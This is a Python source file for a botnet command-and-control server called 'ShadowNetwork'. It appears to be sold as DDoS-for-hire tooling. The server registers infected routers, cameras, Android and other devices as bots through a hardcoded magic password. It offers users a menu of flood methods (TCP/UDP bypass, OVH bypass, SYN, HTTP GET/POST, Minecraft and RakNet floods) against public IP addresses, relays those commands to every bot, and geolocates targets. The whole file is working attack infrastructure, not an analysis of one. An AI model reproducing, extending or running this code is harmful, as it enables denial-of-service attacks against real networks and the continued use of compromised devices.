import ipaddress, time, sys, threading, socket, psutil, requests, re, subprocess, logging
from colorama import Fore, init
import os, secrets, datetime
from datetime import datetime
from mcstatus import JavaServer, BedrockServer
from mcstatus import BedrockServer
from mctools import QUERYClient
import requests
import socket
 
def custom_prompt(username):
    prompt_text = f"{username}@ShadowNetwork > " 
    return rainbow_gradient(prompt_text)


def rainbow_gradient(text):
    colors = [
        (0, 100, 255),     # Blue
        (160, 0, 255),     # Purple
        (255, 0, 180),     # Pink
        (0, 255, 100),     # Green
        (0, 220, 255),     # Sky Blue
        (255, 255, 0)      # Yellow
    ]

    result = ""
    length = len(text)

    for i, char in enumerate(text):
        if char == "\n":
            result += char
            continue

        pos = i / max(1, length - 1)

        section = int(pos * (len(colors) - 1))

        if section >= len(colors) - 1:
            section = len(colors) - 2

        local_pos = (pos * (len(colors) - 1)) - section

        r = int(
            colors[section][0] +
            (colors[section + 1][0] - colors[section][0]) * local_pos
        )

        g = int(
            colors[section][1] +
            (colors[section + 1][1] - colors[section][1]) * local_pos
        )

        b = int(
            colors[section][2] +
            (colors[section + 1][2] - colors[section][2]) * local_pos
        )

        result += f"\033[38;2;{r};{g};{b}m{char}"

    return result + "\033[0m"



def checkhost_info(ip, send, client):
    # Dectected INFO
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
        data = r.json()

        if data["status"] != "success":
            send(client, "Could Cant TrackINFO")
            return

        # DNS
        try:
            hostname = socket.gethostbyaddr(ip)[0]
        except socket.herror:
            hostname = "Unknown"
        except Exception:
            hostname = "Unknown"
        send(client, ansi_clear)
        msg = f"""
{Yellow}IP: {data.get('query')}\r\n
{Yellow}HostName: {hostname}\r\n
{Yellow}ISP / ORG: {data.get('isp')}\r\n
{Yellow}ASN: {data.get('as')}\r\n
{Yellow}Country: {data.get('country')} ({data.get('countryCode')})\r\n
{Yellow}Region: {data.get('regionName')}\r\n
{Yellow}City: {data.get('city')}\r\n
{Yellow}TimeZone: {data.get('timezone')}\r\n
{Yellow}Latitude: {data.get('lat')}\r\n
{Yellow}Longitude: {data.get('lon')}\r\n
"""

        send(client, msg)

    except Exception as e:
        send(client, f"Error TrackINFO: {e}")


os.system("clear")
print("[INFO]: OS Ubuntu 22.04")
time.sleep(0.80)
print("[INFO]: Starting Launcher")
time.sleep(0.80)
print("[INFO]: Server IP: 15.235.145.240")
time.sleep(0.80)
print("[INFO]: Server Port: 14769")
time.sleep(0.80)
print("[INFO]: External Connection Active")
time.sleep(0.80)
print("[INFO]: Port Forwarding Started")
time.sleep(0.80)
print("[INFO]: Starting 100 Workers")
time.sleep(0.80)
print("[INFO]: Starting 90 WATCH DOG")
time.sleep(0.80)
print("[INFO]: Launch Server Worker & WATCH DOG")
time.sleep(0.80)
print("[INFO]: Seted Limit TAINTGPU 70%")
time.sleep(0.80)
print("[INFO]: Replaceing Screen")
time.sleep(0.80)
print("[INFO]: Checking Errors")
time.sleep(3)
print("[INFO]: Cant Find Any Error All fine")
time.sleep(5)
print("[INFO]: Server Active Connect using IP - Port")


Black = "\033[30m"
Red = "\033[31m"
Green = "\033[32m"
Orange = "\033[33m"
Blue = "\033[34m"
Purple = "\033[35m"
Cyan = "\033[36m"
LightGrey = "\033[37m"
DarkGrey = "\033[90m"
LightRed = "\033[91m"
LightGreen = "\033[92m"
Yellow = "\033[93m"
LightBlue = "\033[94m"
Pink = "\033[95m"
LightCyan = "\033[96m"
Reset = "\033[0m"


def get_cpu_load():
    return psutil.cpu_percent(interval=0.5)



shadowload = f"{get_cpu_load()}%"


clients={}
attacks={}

bots={}
bots_by_arch = {
    "mips": [],
    "i386": [],
    "x86_64": [],
    "armv7l": [],
    "armv8l": [],
    "aarch64": [],
    "unknown": [],
    "phpmyadmin": [],
    "x64": [],
    "windows": [],
    "window": [],
    "win11": [],
    "win10": [],
    "x86": [],
    "openwrt": [],
    "openwrt.mips": [],
    "armv51": [],
    "web-panel": [],
    "riscv32": [],
    "sparc": [],
    "sh4": [],
    "iot.nvr": [],
    "powerpc": [],
    "pc": [],
    "tank": [],
    "m68k": [],
    "arc": [],
    "xtensa": [],
    "ppc": [],
    "adb": [],
    "android": [],
    "lfl.exploit": [],
    "router.exp": [],
    "i686": [],
    "mipsel": [],
    "windows.x86": [],
    "echo.router": [],
    "echo.camera": [],
    "echo.iot": [],
    "telnet.echo": [],
    "telnet.x86": [],
    "telnet.arm": [],
    "totolink": [],
    "proxy.android": [],
    "tunnel.nightcat": [],
    "hikvision": [],
    "arm7": [],
    "openwrt.mips": [],
}

maxAttacks=10
rootUser='shadow'

# Its for (Payload Device)
threads=10

ansi_clear = '\033[H\033[2J\033[3J'

def color(data_input_output):
    color_codes = {
        "GREEN": '\033[32m',
        "LIGHTGREEN_EX": '\033[92m',
        "YELLOW": '\033[33m',
        "LIGHTYELLOW_EX": '\033[93m',
        "CYAN": '\033[36m',
        "LIGHTCYAN_EX": '\033[96m',
        "BLUE": '\033[34m',
        "LIGHTBLUE_EX": '\033[94m',
        "MAGENTA": '\033[35m',
        "LIGHTMAGENTA_EX": '\033[95m',
        "RED": '\033[31m',
        "LIGHTRED_EX": '\033[91m',
        "BLSYN": '\033[30m',
        "LIGHTBLSYN_EX": '\033[90m',
        "WHITE": '\033[37m',
        "LIGHTWHITE_EX": '\033[97m',
    }
    return color_codes.get(data_input_output, "")
lightwhite = color("LIGHTWHITE_EX")
gray = color("LIGHTBLSYN_EX")
yellow = color("LIGHTYELLOW_EX")
R='\033[1;31m';B='\033[1;34m';C='\033[1;37m';G='\033[1;32m';Y='\033[1;33m';Q='\033[1;36m'

banner_text = f'''
                      • LIVE | ⁕ Shadow Load {shadowload} | ※ $10


                                ╔═╗╦ ╦╔═╗╔╦╗╔═╗╦ ╦
                                ╚═╗╠═╣╠═╣ ║║║ ║║║║
                                ╚═╝╩ ╩╩ ╩═╩╝╚═╝╚╩╝
                      ╚══════════════════════════════════╝
                ╔════╩════════════════════════════════════╩════╗
                ║                 Understand                   ║
                ║                 Type: help                   ║
                ╚══════════════════════════════════════════════╝
                ╔══════════════════════════════════════════════╗
                ║               Deninal of Botnet              ║
                ║ Copyright © 2026 Shadow. All Rights Reserved ║
                ╚══════════════════════════════════════════════╝
'''
banner = rainbow_gradient(banner_text)

def botnetMethodsName(method):
    method_name = {
        ".tcp": '     TCP BYPASS',
        ".udp": '     UDP BYPASS',
        ".mix": '     TCP+UDP BYPASS',
        ".ovhtcp": '  OVH TCP BYPASS',
        ".ovhudp": '  OVH UDP BYPASS',
        ".syn": '     TCP + SYN',
        ".hex": '     HEX Flood',
        ".mcpe": '    Minecraft MCPE Attack',
        ".stdhex": '  Payload RAW STDHEX',
        ".udppps": '  UDPPPS Sent Raw Packet',
        ".udpkill": ' UDPKILL Flood',
        ".raknet": '  RAKNET Flood',
        ".ovhpps": '  OVH DDOS PACKET RAW',
        ".udpgame": ' UDP GAME Flood',
        ".udpquery": 'PING Flood',
        ".httpget": ' HTTP GET US Thread 1024',
        ".httpost": ' HTTP POST US Packet 976624',
        ".httpbrow": 'HTTP BROW US DOS 618'
    }
    if method == 'ALL':
        return method_name
    return method_name.get(method, "")

def isBotnetMethod(method):
    return botnetMethodsName(method) != ""

def remove_bot_by_address(address):
    for arch in bots_by_arch:
        for bot in bots_by_arch[arch]:
            client, bot_address = bot
            if client == address:
                client.close()
                bots_by_arch[arch].remove(bot)
                return

def list_arch_counts(client, send):
    if not bots_by_arch:
        send(client, f'{Fore.LIGHTWHITE_EX}\nNo Infected :C\n')
        return

    send(client, f'{C}Infected: {G}{len(bots)}')
    for i, (arch, bot_list) in enumerate(bots_by_arch.items(), 1):
        if len(bot_list) > 0:
            send(client, f"{C}{arch}: {G}{len(bot_list)}")
    send(client, '')

def removeAttacks(username, timeout):
    time.sleep(timeout)
    if username in attacks:
        del attacks[username]

def checkUserAttack(username):
    if username in attacks:
        return False
    return True

def TargetIsAlreadySent(target, user):
    for user, info in attacks.items():
        if info['target'] == target:
            return False
    return True

def validate_ip(ip):
    parts = ip.split('.')
    return len(parts) == 4 and all(x.isdigit() for x in parts) and all(0 <= int(x) <= 255 for x in parts) and not ipaddress.ip_address(ip).is_private
    
def validate_port(port, rand=False):
    if rand:
        return port.isdigit() and int(port) >= 0 and int(port) <= 65535
    else:
        return port.isdigit() and int(port) >= 1 and int(port) <= 65535

def validate_time(time):
    return time.isdigit() and int(time) >= 10 and int(time) <= 1200

def check_Blacklisted_Target(target):
    try:
        with open('blacklist.txt', 'r') as file:
            blacklist_target = {x.strip() for x in file if x.strip()}
        return target in blacklist_target
    except FileNotFoundError:
        print("File 'blacklist.txt' No Found")
        return False

def find_login(username, password):
    credentials = [x.strip() for x in open('logins.txt').readlines() if x.strip()]
    for x in credentials:
        c_username, c_password = x.split(':')
        if c_username.lower() == username.lower() and c_password == password:
            return True

def blacklist_idk(args, send, client):
    try:
        choice = (args[1]).lower()

        if choice == 'add':
            if len(args) == 3:
                target = args[2]
                with open('blacklist.txt', 'a') as blacklist:
                    blacklist.write(f'\n{target}')
                    blacklist.close()
                    send(client, ansi_clear)
                    send(client, f'{Green}\nTarget IP has been Blacklisted\n')
            else:
                send(client, ansi_clear)
                send(client, '\nblacklist add [Target IP]\n')
        
        if choice == 'remove':
            if len(args) == 3:
                target = args[2]
                with open("blacklist.txt", "r") as blacklist:
                    lines = blacklist.readlines()
                    blacklist.close()

                with open("blacklist.txt", "w") as blacklist:
                    for line in lines:
                        if target not in line:
                            blacklist.write(line)
                    blacklist.close()
                send(client, ansi_clear)
                send(client, f'{Green}\nRemoved Target IP Successfully!\n')
            else:
                send(client, ansi_clear)
                send(client, '\nblacklist remove [Target IP]\n')
        
        if choice == 'list':
                blacklist = [x.strip() for x in open('blacklist.txt').readlines() if x.strip()]
                for x in blacklist:
                    send(client, ansi_clear)
                    send(client, f"{Green} Target:")
    except:
        send(client, ansi_clear)
        send(client, '\nblacklist add:list:remove\n')

def users(args, send, client):
    try:
        choice = (args[1]).lower()
        if choice == 'add':
            if len(args) == 4:
                user = args[2]
                password = args[3]
                with open('logins.txt', 'a') as logins:
                    logins.write(f'\n{user}:{password}')
                    logins.close()
                    send(client, ansi_clear)
                    send(client, f'{Green}\nAdded NEW Usered Successfully.\n')
            else:
                send(client, ansi_clear)
                send(client, '\nuser add (Username) (Password)\n')
        if choice == 'remove':
            if len(args) == 3:
                user = args[2]
                with open("logins.txt", "r") as logins:
                    lines = logins.readlines()
                    logins.close()

                with open("logins.txt", "w") as logins:
                    for line in lines:
                        if user not in line:
                            logins.write(line)
                    logins.close()
                send(client, ansi_clear)
                send(client, f'{Green}\nRemoved Usered Successfully!\n')
            else:
                send(client, ansi_clear)
                send(client, '\nuser remove (Username)\n')
        if choice == 'list':
                credentials = [x.strip() for x in open('logins.txt').readlines() if x.strip()]
                for x in credentials:
                    c_username, c_password = x.split(':')
                    send(client, f"{lightwhite}Username: {gray}{c_username}{lightwhite} | Password: {gray}{c_password}{lightwhite}")
    except:
        send(client, ansi_clear)
        send(client, '\nuser add:list:remove\n')

def send(socket, data, escape=True, reset=True):
    if reset:
        data += Fore.RESET
    if escape:
        data += '\r\n'
    socket.send(data.encode())

def broadcast(data, user):
    dead_bots = []
    for bot in bots.keys():
        try:
            if len(data) > 5:
                send(bot, f'{data} {threads} {user}', False, False)
            else:
                send(bot, f'{data} {user}', False, False)
        except:
            dead_bots.append(bot)
    for bot in dead_bots:
        bots.pop(bot)
        bot.close()

def ping():
    while 1:
        dead_bots = []
        for bot in bots.keys():
            try:
                bot.settimeout(5)
                send(bot, 'PING', False, False)
                if bot.recv(1024).decode() != 'PONG':
                    dead_bots.append(bot)
            except:
                dead_bots.append(bot)
            
        for bot in dead_bots:
            bots.pop(bot)
            bot.close()
            remove_bot_by_address(bot)
        time.sleep(2)

def update_title(client, name):
    titles = [
        'ShadowNetwork'
        ]
    while True:
        try:
            for title in titles:
                send(client, f"\33]0;{title} | Username: {name} | Users: {len(clients)} | Attacks: {len(attacks)}/{maxAttacks} | Infected: {len(bots)} \a", False)
                time.sleep(0.6)
        except Exception as e:
            print(f"An Error To Shadow TITLE: {e}")
            client.close()
            break

def command_line(client, username):
    for x in banner.split('\n'):
        send(client, x)

    prompt = custom_prompt(username)
    send(client, prompt, False)

    while 1:
        try:
            data = client.recv(1024).decode().strip()
            if not data:
                continue

            args = data.split(' ')
            command = args[0].lower()

            if command == 'help':
                send(client, ansi_clear)

                for line in rainbow_gradient(r'''
                               ╦ ╦ ╔═╗ ╦   ╔═╗
                               ╠═╣ ╠═  ║   ╠═╝
                               ╩ ╩ ╚═╝ ╩═╝ ╩

              ╚═══════════════════════════════════════════════╝
            ╔════╩══════════════════════════════════════════╩════╗
                methods                   Show Methods
                bots                      Show Bots
                stop                      Stop Your Attack
                clear                     Clear Your Terminal
                exit                      Exit ShadowNetwork
                user                      Add/Delete Users                      
                blacklist                 Add/Delete IP Blacklist
                trackinfo                 Track IP INFO
                version                   Network Version
                about                     About Info
                changelog                 About ChangeLog
            ╚════════════════════════════════════════════════════╝
                      ''').split('\n'):
                          send(client, line)

            elif command == 'methods':
                botnetMethods = botnetMethodsName('ALL')
                send(client, ansi_clear)
                send(client, f'{Red}METHODS\r\n')
                for m, desc in botnetMethods.items():
                    send(client, '\x1b[3;31;40m' + f"{m}       {desc}")
                send(client, '')
            
            elif command == 'bots':
                send(client, ansi_clear, False)
                for x in banner.split('\n'):
                    send(client, x)
                list_arch_counts(client, send)

            elif command == 'user':
                if username == rootUser:
                    users(args, send, client)

            elif command == 'trackinfo':
                if len(args) == 2:
                    checkhost_info(args[1], send, client)
                else:
                    send(client, ansi_clear)
                    send(client, "trackinfo (IP)")

            elif command == 'stop':
                if username in attacks:
                    del attacks[username]
                    broadcast(data, username)
                    send(client, ansi_clear)
                    send(client, f'\n{Green}Successfully Stopped Your Attack\n')
                else:
                    send(client, ansi_clear)
                    send(client, f'\n{Red}You have not any Attack Launched\n')

            elif command == 'blacklist':
                if username == rootUser:
                    blacklist_idk(args, send, client)

            elif command == 'clear':
                send(client, ansi_clear, False)
                for x in banner.split('\n'):
                    send(client, x)

            elif command == 'version':
                send(client, ansi_clear)
                send(client, f'{Blue}ShadowNET Version: 4')

            elif command == 'about':
                send(client, ansi_clear)
                send(client, f'{Purple}Credit....: ShadowGamerzNET')
                send(client, f'{Purple}Discord...: ShadowGamerzNET')
                send(client, f'{Purple}Username..: ShadowGamerzNET')
                send(client, f'{Purple}GameTag...: ShadowGamerzNET')
                send(client, f'{Purple}Lang......: PYTHON/GO/JAVA/SCRIPT')
                send(client, f'{Purple}License...: ShadowGamerzNET')
                send(client, f'{Purple}Powered...: ShadowGamerzNET')

            elif command == 'changelog':
                send(client, ansi_clear)
                send(client, f'{Purple}Added...: New Methods')
                send(client, f'{Purple}Added...: Explore')
                send(client, f'{Purple}Added...: JavaLauncherNETPXExit')


            elif command == 'exit':
                send(client, f'\n{Reset}SEE YOU LATER\n')
                time.sleep(3)
                break
            
            elif isBotnetMethod(command):
                if len(args) == 4:
                    ip = args[1]
                    port = args[2]
                    secs = args[3]

                    if check_Blacklisted_Target(ip) == False:
                        if validate_ip(ip):
                            if validate_port(port):
                                if validate_time(secs):
                                    if len(attacks) < maxAttacks:
                                        if checkUserAttack(username):
                                            if TargetIsAlreadySent(ip, username):                                                
                                                send(client, ansi_clear)
                                                attackSend = f'''
                        ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═   ╔═╗╔═╗╔╗╗╔╦╗
                        ╠═╣ ║  ║ ╠═╣║  ╠╩╗   ╚═╗╠═ ║║║ ║ 
                        ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩   ╚═╝╚═╝╩╚╝ ╩
                       ╚════════════════════════════════╝
                 ╔════╩══════════════════════════════════╩═══╗
                      IP............: {ip}
                      Port..........: {port}
                      Duration......: {secs}
                      Method........: {botnetMethodsName(command).strip()}{gray}
                      Attack by.....: {username}
                      PPS...........: N/A
                      Location......: N/A
                 ╚════════════════════════════════════════════╝'''
                                                
                                                for x in attackSend.split('\n'):
                                                    send(client, '\x1b[3;31;40m'+ x)

                                                broadcast(data, username)
                                                attacks.update({username: {'target': ip, 'duration': secs}})
                                                threading.Thread(target=removeAttacks, args=(username, int(secs))).start()
                                            
                                            else:
                                                send(client, Fore.YELLOW + "Your Target Attack Attack by Others\n")
                                        else:
                                            send(client, ansi_clear)
                                            send(client, Fore.YELLOW + "You Can Launch Only 1 Attack\n")
                                    else:
                                        send(client, ansi_clear)
                                        send(client, Fore.YELLOW + 'No Attacks Slots Available!\n')
                                else:
                                    send(client, Fore.YELLOW + 'Invalid Duration (10-1200 Seconds)\n')
                            else:
                                send(client, ansi_clear)
                                send(client, Fore.YELLOW + 'Invalid Port (1-65535)\n')
                        else:
                            send(client, ansi_clear)
                            send(client, Fore.YELLOW + 'Invalid IP Address\n')
                    else:
                        send(client, ansi_clear)
                        send(client, Fore.YELLOW + 'Target IP Is Blacklisted\n')
                else:
                    send(client, ansi_clear)
                    send(client, f'{Yellow}{command} (Target IP) (Target Port) (Time)\n')

            send(client, prompt, False)
        except Exception as e:
            print(f'Terimnal Prompt Error: {e}')
            break
    client.close()
    if client in clients:
        del clients[client]

def handle_client(client, address):
    send(client, f'\33]0;Please Enter Your ShadowNetwork Credentials\a', False)

    # Username
    while 1:
        send(client, ansi_clear, False)
        send(client, f'{Yellow}                               Username{Reset}: ', False)
        username = client.recv(1024).decode().strip()
        if not username:
            continue
        break

    # Password
    password = ''
    while 1:
        send(client, ansi_clear)
        send(client, f'{Yellow}                               Password{Reset}: ', False, False)
        while not password.strip():
            password = client.recv(1024).decode('cp1252').strip()
        break
        
    # Handle Client
    if password != '\xff\xff\xff\xff\75':
        send(client, ansi_clear, False)

        if not find_login(username, password):
            send(client, Fore.RED + 'Invalid Credentials')
            time.sleep(1)
            client.close()
            return

        clients.update({client: address})
        threading.Thread(target=update_title, args=(client, username)).start()
        threading.Thread(target=command_line, args=[client, username]).start()


    # Handle Device
    else:
        bot_arch = username
        
        if bot_arch not in bots_by_arch:
            bot_arch = 'unknown'
        
            
        bots.update({client: address})
        bots_by_arch[bot_arch].append((client, address))

def main():
    port = 777
    
    init(convert=True)

    sock = socket.socket()
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        sock.bind(('0.0.0.0', port))
    except:
        print('Failed')
        exit()

    sock.listen()

    threading.Thread(target=ping).start() # KEEPALIVE

    # Connected Raw Socket
    while 1:
        threading.Thread(target=handle_client, args=[*sock.accept()]).start()

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\nShadowNetwork Poweroff")
        os._exit(1)
